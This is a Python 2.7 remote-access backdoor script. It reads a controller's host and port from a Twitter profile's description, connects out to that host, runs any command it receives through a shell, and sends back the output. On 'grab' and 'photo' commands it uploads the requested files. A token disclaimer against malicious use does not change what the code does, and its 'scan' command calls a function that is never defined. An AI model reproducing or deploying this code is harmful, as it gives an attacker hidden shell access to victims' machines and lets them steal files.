import socket
import os
import subprocess
from BeautifulSoup import BeautifulSoup as thesoup
import urllib
import re
from PIL import ImageGrab 
import tempfile           
import shutil
import requests
import time
import nmap

#Used to connect to a host and port via Twitter.  Host and Port must be posted in 'host*port' format.
# Python 2.7
#Do not use for malicious purposes - yeah I know I can't stop you but just don't
#I am not responsible for what you choose to use this code for

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send("DONE")
        f.close()
    else:
        s.send("Unable to fine the file")
def connect(host,port):
    s = socket.socket()

    s.connect((host,port))

    while True:
        command = s.recv(1024)

        if 'terminate' in command:
            s.close()
            break
        elif 'grab' in command:
            grab,path = command.split('*')
            try:
                transfer(s,path)
            except Exception, e:
                s.send(str(e))
                pass
        elif 'photo' in command:
            photo, path = command.split('*')
            try:
                transfer(s, path)
            except Exception, e:
                s.send(str(e))
        elif 'cd' in command:
            try:
                code,directory = command.split(' ')
                os.chdir(directory)
                s.send("[+] CWD Is " + os.getcwd())
            except:
                s.send("[!] Directory does not exist or is unavailable at this time")
        elif  'scan' in command:
            scanner()
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())
def gethost():
    global host
    global port

    html = urllib.urlopen('https://twitter.com/51stMonarchy').read() # Replace 'USERNAME' with Twitter username
    soup = thesoup(html)

    x = soup.find("meta", {"name": "description"})['content']

    filter = re.findall(r'"(.*?)"', x)
    tweet = filter[0]
    attempt, thenum = tweet.split('*')
    host = str(attempt)
    port = int(thenum)
    connect(host, port)
def main():
    gethost()

main()
